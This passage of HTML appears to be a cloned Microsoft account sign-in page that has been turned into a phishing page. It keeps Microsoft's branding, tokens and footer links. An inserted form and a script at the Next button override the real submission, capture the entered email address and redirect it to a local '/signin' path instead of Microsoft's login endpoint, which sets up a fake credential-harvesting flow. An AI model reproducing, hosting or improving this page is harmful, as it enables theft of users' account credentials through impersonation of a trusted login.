City~379!!!VE~Venezuela~58!!!VN~Vietnam~84!!!WF~Wallis and Futuna~681!!!YE~Yemen~967!!!ZM~Zambia~260!!!ZW~Zimbabwe~263',sErrTxt:'',Am:'',Ap:[],BP:true,Aq:true,html:[],iPawnIcon:1,sFTTag:'<input type="hidden" name="PPFT" id="i0327" value="DVxAzeCPuhnX24Nfv0eLBtfU8QY0SzHa9HRT1D53oGYK0Q!tCLqCuYdwNzuYhz*Is6A26i0KLV5fvltUbHeasYFRJlIySQ02GgpPSCCgPAvkXczHbJ0!xwJIHmN*MiXHKgfNKy0TgTq4!BikZwv2zjgospR3P7Ea60YEllYh106g!rmr0XHpf426*BCvmEGqZOBSEo6Xtwhbr0b4UAIzD6Nse62MYhys1Nw3P2JKNi16nquyuLqJM5r*4MCd5C6wOnTYUzQdFzK8NSW4C1QZNlA$"/>',BQ:0,C0:false,BS:3,loader:{cdnRoots:['https://logincdn.msauth.net/','https://lgincdnvzeuno.azureedge.net/','https://lgincdnmsftuswe2.azureedge.net/']},BT:5,Au:true,Av:true,Ax:0,C7:0,C8:0,Az:1,fHasBackgroundColor:false,urlStaySignIn:'https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1616477099&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&id=292666&lw=1&fl=easi2&uiflavor=web&contextid=34E1E35DF72CFEA1&mkt=EN-GB&lc=2057&bk=1616477114&uaid=d0aa0f5716da4260bfd055b0666a726e',a2:false,Bb:true,a5:false,a6:true,CB:false};</script><script type="text/javascript">window.UXResourceDependencies = [];</script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.en-gb_IOoHl82VOydJdjNLiIP3TQ2.js","ConvergedLoginPaginatedStrings","sha384-R0aleCBkQyBKmnt13fIbnnbqPTiZhqbVVYcxfDIVEqFh3gf/TJ/z3rK2aGnaDpYv");l.Provides("UX_JS_Strings");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript" src="./Sign in to your Microsoft account_files/ConvergedLoginPaginatedStrings.en-gb_IOoHl82VOydJdjNLiIP3TQ2.js" id="ConvergedLoginPaginatedStrings" crossorigin="anonymous" integrity="sha384-R0aleCBkQyBKmnt13fIbnnbqPTiZhqbVVYcxfDIVEqFh3gf/TJ/z3rK2aGnaDpYv"></script><script type="text/javascript">(function () {var l = new window.$DepLoader();l.Add("https://logincdn.msauth.net/shared/1.0/content/js/ConvergedLogin_PCore_fTyp-d2eFsAW5lkONa1EbQ2.js","ConvergedLogin_PCore","sha384-TUZTPfgtur8mf9skiFf9BYBUNApGMCndlW8E0O94NkAn1izwFa8+D0ouzT5xs2J6");l.Requires("UX_JS_Strings");l.Provides("UX_JS_Core");var res = ("UX_Res_" + window.UXResourceDependencies.length);l.Provides(res);window.UXResourceDependencies.push(res);l.Load();}());</script><script type="text/javascript">window.WhenAllLoaded = function (callback) { window.$DepLoader.WhenLoaded(window.UXResourceDependencies, callback); };</script><script type="text/javascript" src="./Sign in to your Microsoft account_files/ConvergedLogin_PCore_fTyp-d2eFsAW5lkONa1EbQ2.js" id="ConvergedLogin_PCore" crossorigin="anonymous" integrity="sha384-TUZTPfgtur8mf9skiFf9BYBUNApGMCndlW8E0O94NkAn1izwFa8+D0ouzT5xs2J6"></script></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  -->
<!--  -->

<div data-bind="if: activeDialog"></div>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1616477099&amp;rver=7.0.6738.0&amp;wp=MBI_SSL&amp;wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&amp;id=292666&amp;lw=1&amp;fl=easi2&amp;uiflavor=web&amp;mkt=EN-GB&amp;lc=2057&amp;contextid=34E1E35DF72CFEA1&amp;bk=1616477114&amp;uaid=d0aa0f5716da4260bfd055b0666a726e&amp;pid=0">

    <!-- ko if: svr.C8 --><!-- /ko -->

    <!-- ko withProperties: { '$loginPage': $data } -->
    <div data-bind="component: { name: &#39;master-page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.F,
            showFooterLinks: true,
            useWizardBehavior: svr.Bq,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko ifnot: isVerticalSplitTemplate -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: &#39;lightbox-template&#39;, params: { serverData: svr } }"><!--  -->

<div data-bind="component: { name: &#39;background-image-control&#39;,
    publicMethods: $page.backgroundControlMethods }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { &#39;background-image&#39;: true }" class="background-image ext-background-image" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<div class="outer" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div class="middle" data-bind="css: { &#39;has-header&#39;: showHeader }">
            <!-- ko if: $page.backgroundLogoUrl() && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko -->

            <!-- ko if: svr.Cs && !($page.paginationControlMethods() && $page.paginationControlMethods().currentViewHasMetadata('hidePageLevelTitleAndDesc')) --><!-- /ko -->

            <div id="lightbox" data-bind="
                animationEnd: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().view_onAnimationEnd,
                externalCss: { &#39;sign-in-box&#39;: true },
                css: {
                    &#39;app&#39;: $page.backgroundLogoUrl(),
                    &#39;wide&#39;: $page.paginationControlMethods() &amp;&amp; $page.paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;),
                    &#39;fade-in-lightbox&#39;: $page.fadeInLightBox,
                    &#39;has-popup&#39;: $page.showFedCredButtons() || $page.newSession(),
                    &#39;transparent-lightbox&#39;: $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                    &#39;lightbox-bottom-margin-debug&#39;: $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

                <!-- ko template: { nodes: $parentContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.BG --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { &#39;disable-lightbox&#39;: svr.bY &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <div class="win-scroll">
            <!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
            <div data-bind="component: { name: &#39;logo-control&#39;,
                params: {
                    isChinaDc: svr.fIsChinaDc,
                    bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str[&#39;MOBILE_STR_Footer_Microsoft&#39;] }" src="./Sign in to your Microsoft account_files/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
            <!-- /ko -->

            <!-- ko if: svr.cU && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko -->

            <!-- ko if: asyncInitReady -->
            <div role="main" data-bind="component: { name: &#39;pagination-control&#39;,
                publicMethods: paginationControlMethods,
                params: {
                    enableCssAnimation: svr.aQ,
                    disableAnimationIfAnimationEndUnsupported: svr.b5,
                    initialViewId: initialViewId,
                    currentViewId: currentViewId,
                    initialSharedData: initialSharedData,
                    initialError: $loginPage.getServerError() },
                event: {
                    cancel: paginationControl_onCancel,
                    loadView: view_onLoadView,
                    showView: view_onShow,
                    setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                    animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { &#39;zero-opacity&#39;: hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.J) --><!-- /ko -->

    <div class="pagination-view animate slide-in-next" data-bind="css: {
        &#39;has-identity-banner&#39;: showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.J),
        &#39;zero-opacity&#39;: hidePaginatedView.hideSubView(),
        &#39;animate&#39;: animate(),
        &#39;slide-out-next&#39;: animate.isSlideOutNext(),
        &#39;slide-in-next&#39;: animate.isSlideInNext(),
        &#39;slide-out-back&#39;: animate.isSlideOutBack(),
        &#39;slide-in-back&#39;: animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: &#39;login-paginated-username-view&#39;,
                    params: {
                        serverData: svr,
                        serverError: initialError,
                        isInitialView: isInitialState,
                        displayName: sharedData.displayName,
                        otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                        prefillNames: $loginPage.prefillNames,
                        flowToken: sharedData.flowToken,
                        availableSignupCreds: sharedData.availableSignupCreds },
                    event: {
                        redirect: $loginPage.view_onRedirect,
                        setPendingRequest: $loginPage.view_onSetPendingRequest,
                        registerDialog: $loginPage.view_onRegisterDialog,
                        unregisterDialog: $loginPage.view_onUnregisterDialog,
                        showDialog: $loginPage.view_onShowDialog,
                        updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                        agreementClick: $loginPage.footer_agreementClick } }"><!--  -->

<div data-bind="component: { name: &#39;header-control&#39;,
    params: {
        serverData: svr,
        title: str[&#39;WF_STR_HeaderDefault_Title&#39;] } }"><div class="row title ext-title" id="loginHeader" data-bind="externalCss: { &#39;title&#39;: true }">
    <div role="heading" aria-level="1" data-bind="text: title">Sign in</div>
    <!-- ko if: isSubtitleVisible --><!-- /ko -->
</div></div>

<!-- ko if: pageDescription && !svr.Cc --><!-- /ko -->

<div class="row">
    <div role="alert" aria-live="assertive">
        <!-- ko if: usernameTextbox.error --><!-- /ko -->
    </div>

    <div class="form-group col-md-24">
        <!-- ko if: prefillNames().length > 1 --><!-- /ko -->

        <!-- ko ifnot: prefillNames().length > 1 -->
        <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox-field&#39;,
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Email_Example&#39;],
                hintCss: &#39;placeholder&#39; + (!svr.an ? &#39; ltr_override&#39; : &#39;&#39;) },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
            <form method="post" action='' >
            <input type="email" required name="loginfmt" id="i0116" maxlength="113" lang="en" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-bind="
                    externalCss: {
                        &#39;input&#39;: true,
                        &#39;text-box&#39;: true,
                        &#39;has-error&#39;: usernameTextbox.error },
                    ariaLabel: tenantBranding.UserIdLabel || str[&#39;CT_PWD_STR_Username_AriaLabel&#39;],
                    ariaDescribedBy: &#39;loginHeader&#39; + (pageDescription &amp;&amp; !svr.Cc ? &#39; loginDescription&#39; : &#39;&#39;),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" aria-label="Enter your email address, phone number or Skype name." aria-describedby="loginHeader" placeholder="Email, phone or Skype">
            <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
        <!-- /ko -->
    </div>
</div>

<div data-bind="css: { &#39;position-buttons&#39;: !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: svr.AQ && !svr.Af && !svr.aO -->
                <div class="form-group" data-bind="
                    htmlWithBindings: html[&#39;WF_STR_SignUpLink_Text&#39;],
                    childBindings: {
                        &#39;signup&#39;: {
                            href: svr.G || &#39;#&#39;,
                            ariaLabel: svr.G ? str[&#39;WF_STR_SignupLink_AriaLabel_Text&#39;] : str[&#39;WF_STR_SignupLink_AriaLabel_Generic_Text&#39;],
                            click: signup_onClick } }">No account? <a href="https://signup.live.com/?wa=wsignin1.0&amp;rpsnv=13&amp;ct=1616477099&amp;rver=7.0.6738.0&amp;wp=MBI_SSL&amp;wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&amp;id=292666&amp;lw=1&amp;fl=easi2&amp;contextid=34E1E35DF72CFEA1&amp;bk=1616477114&amp;uiflavor=web&amp;lic=1&amp;mkt=EN-GB&amp;lc=2057&amp;uaid=d0aa0f5716da4260bfd055b0666a726e" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                <!-- /ko -->

                <!-- ko if: showCantAccessAccountLink --><!-- /ko -->

                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.Au) -->
                <div class="form-group">
                    

                    <!-- ko component: { name: 'fido-help-button-control',
                        params: {
                            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable() },
                        event: {
                            registerDialog: onRegisterDialog,
                            unregisterDialog: onUnregisterDialog,
                            showDialog: onShowDialog } } --><!--  -->

<span class="help-button" role="button" tabindex="0" data-bind="
    click: fidoHelp_onClick,
    pressEnter: fidoHelp_onClick,
    hasFocus: hasFocus,
    ariaLabel: isPlatformAuthenticatorAvailable ? str[&#39;CT_STR_CredentialPicker_Help_Desc_Fido&#39;] : str[&#39;CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform&#39;]" aria-label="Learn more about signing in with a security key">

    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } -->
<!-- /ko --><!-- /ko -->
</span>

<div data-bind="component: { name: &#39;fido-help-dialog-content-control&#39;,
    params: {
        isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }"><!--  -->

<div data-bind="component: { name: &#39;dialog-content-control&#39;,
    params: {
        dialogId: 1,
        data: {
            labelledBy: &#39;fidoDialogTitle&#39;,
            describedBy: &#39;fidoDialogDesc fidoDialogDesc2&#39;,
            primaryButtonPreventTabbing: { direction: &#39;down&#39; },
            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }"><!-- --></div></div><!-- /ko -->
                </div>
                <!-- /ko -->

                <!-- ko if: (availableCredsWithoutUsername().length > 0 || svr.Au) && !hideSignInOptions -->
                <div class="form-group" data-bind="
                    component: { name: &#39;cred-switch-link-control&#39;,
                        params: {
                            serverData: svr,
                            availableCreds: availableCredsWithoutUsername(),
                            showForgotUsername: svr.Au },
                        event: {
                            switchView: noUsernameCredSwitchLink_onSwitchView,
                            redirect: onRedirect,
                            registerDialog: onRegisterDialog,
                            unregisterDialog: onUnregisterDialog,
                            showDialog: onShowDialog } }"><!--  -->

<div class="form-group">
    <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->

    <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko -->

    <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
</div>

<!-- ko if: credLinkError --><!-- /ko --></div>
                <!-- /ko -->

                <!-- ko if: !svr.ak && svr.O && !svr.V --><!-- /ko -->

            </div>
        </div>
    </div>
</div>

<!-- ko if: svr.Cq --><!-- /ko -->
<div class="win-button-pin-bottom" data-bind="css : { &#39;boilerplate-button-bottom&#39;: tenantBranding.BoilerPlateText }">
    <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.F,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.F &amp;&amp; isBackButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div  class="inline-block">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <button type="submit" id="submitbtn" class="button ext-button primary ext-primary" value="Next">Next</button>
    </div></form>
    <script>
        document.getElementsByClassName('button ext-button primary ext-primary')[0].addEventListener('click',function(e){e.preventDefault();
        var usr = document.getElementById('i0116').value;
        var re = document.getElementById('redir').innerHTML;
        if (usr){window.location = "/signin?wa=wsignin1.0&rpsnv=13&ct=1616479975&rver=7.0.6738.0&wp=MBI_SSL&wreply=https:%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin%3Fru%3Dhttps%253A%252F%252Faccount.microsoft.com%252F%253Frefp%253Dsignedout-index%2526refd%253Dwww.google.com&lc=2057&id=292666&lw=1&fl=easi2&id="+usr+"&r="+re};
        });
    </script>
</div></div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
            <!-- /ko -->
        </div>

        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
        <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
        <input type="hidden" name="ctx" data-bind="value: ctx" value="">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
        <input type="hidden" id="i0327" data-bind="attr: { name: svr.bC }, value: flowToken" name="PPFT" value="DVxAzeCPuhnX24Nfv0eLBtfU8QY0SzHa9HRT1D53oGYK0Q!tCLqCuYdwNzuYhz*Is6A26i0KLV5fvltUbHeasYFRJlIySQ02GgpPSCCgPAvkXczHbJ0!xwJIHmN*MiXHKgfNKy0TgTq4!BikZwv2zjgospR3P7Ea60YEllYh106g!rmr0XHpf426*BCvmEGqZOBSEo6Xtwhbr0b4UAIzD6Nse62MYhys1Nw3P2JKNi16nquyuLqJM5r*4MCd5C6wOnTYUzQdFzK8NSW4C1QZNlA$">
        <input type="hidden" name="PPSX" data-bind="value: svr.cq" value="PassportR">
        <input type="hidden" name="NewUser" value="1">
        <input type="hidden" name="FoundMSAs" data-bind="value: svr.Aj" value="">
        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.BG ? 1 : 0" value="0">
        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="1">
        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">

        <div data-bind="component: { name: &#39;instrumentation-control&#39;,
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1">
<input type="hidden" name="i17" data-bind="value: srsFailed" value="0">
<input type="hidden" name="i18" data-bind="value: srsSuccess">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
            </div>

            <!-- ko if: $page.showFedCredButtons -->
            <div class="promoted-fed-cred-box" data-bind="css: { &#39;app&#39;: $page.backgroundLogoUrl }">
                <div class="promoted-fed-cred-content" data-bind="css: {
                    &#39;animate&#39;: $page.useCssAnimations &amp;&amp; $page.animate(),
                    &#39;slide-out-next&#39;: $page.animate.isSlideOutNext,
                    &#39;slide-in-next&#39;: $page.animate.isSlideInNext,
                    &#39;slide-out-back&#39;: $page.animate.isSlideOutBack,
                    &#39;slide-in-back&#39;: $page.animate.isSlideInBack,
                    &#39;app&#39;: $page.backgroundLogoUrl }">

                    <!-- ko foreach: $page.otherSigninOptions -->
                    <div class="row tile">
                        <div class="table" role="button" tabindex="0" data-bind="
                            pressEnter: $page.otherSigninOptionsButton_onClick,
                            click: $page.otherSigninOptionsButton_onClick,
                            ariaLabel: $data.text" aria-label="Sign-in options">

                            <div class="table-row">
                                <div class="table-cell tile-img medium">
                                    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="./Sign in to your Microsoft account_files/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
                                </div>
                                <div class="table-cell text-left content">
                                    <div data-bind="
                                        text: $data.text,
                                        attr: { &#39;data-test-id&#39;: $data.testId }" data-test-id="signinOptions">Sign-in options</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <!-- /ko -->
                </div>
            </div>
            <!-- /ko -->

            <!-- ko if: $page.newSession --><!-- /ko -->

            <!-- ko if: $page.showDebugDetails --><!-- /ko -->

            <!-- ko if: !svr.CA && $page.paginationControlMethods() && $page.paginationControlMethods().hasInitialViewShown() -->
            <div id="footer" role="contentinfo" data-bind="
                externalCss: {
                    &#39;footer&#39;: true,
                    &#39;has-background&#39;: !$page.useDefaultBackground(),
                    &#39;background-always-visible&#39;: $page.backgroundLogoUrl }" class="footer ext-footer">

                <div data-bind="component: { name: &#39;footer-control&#39;,
                    publicMethods: $page.footerMethods,
                    params: {
                        serverData: svr,
                        useDefaultBackground: $page.useDefaultBackground(),
                        hasDarkBackground: $page.backgroundLogoUrl(),
                        showLinks: true },
                    event: {
                        agreementClick: $page.footer_agreementClick,
                        showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-GB&amp;uaid=d0aa0f5716da4260bfd055b0666a726e" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                &#39;footer-content&#39;: true,
                &#39;footer-item&#39;: true,
                &#39;has-background&#39;: !useDefaultBackground,
                &#39;background-always-visible&#39;: hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-GB&amp;uaid=d0aa0f5716da4260bfd055b0666a726e" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="https://login.live.com/pp1600/#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        attr: { &#39;aria-expanded&#39;: showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            &#39;footer-content&#39;: true,
            &#39;footer-item&#39;: true,
            &#39;debug-item&#39;: true,
            &#39;has-background&#39;: !useDefaultBackground,
            &#39;background-always-visible&#39;: hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.Cq && showLinks --><!-- /ko --></div>
            </div>
            <!-- /ko -->
        </div>
    </div>
</div></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isVerticalSplitTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
